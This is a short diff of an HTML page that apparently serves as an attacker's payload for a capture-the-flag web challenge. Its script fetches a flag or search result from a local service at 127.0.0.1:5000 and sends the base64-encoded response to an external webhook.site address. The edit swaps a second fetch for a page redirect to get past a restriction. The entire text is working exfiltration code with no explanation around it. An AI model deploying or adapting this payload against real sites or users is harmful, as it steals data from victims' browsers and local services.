@@ -2,10 +2,10 @@
   <body>
     <h1>Loading...</h1>
     <script>
-      fetch("http://127.0.0.1:5000/flag")
+      fetch("http://127.0.0.1:5000/search?q=flag")
         .then(res => res.text())
         .then(data => {
-          fetch("https://webhook.site/ba5ed2dc-0a06-4151-84dd-432789909b1c?data=" + btoa(data));
+          location.href = "https://webhook.site/ba5ed2dc-0a06-4151-84dd-432789909b1c?data=" + btoa(data);
         });
     </script>
   </body>
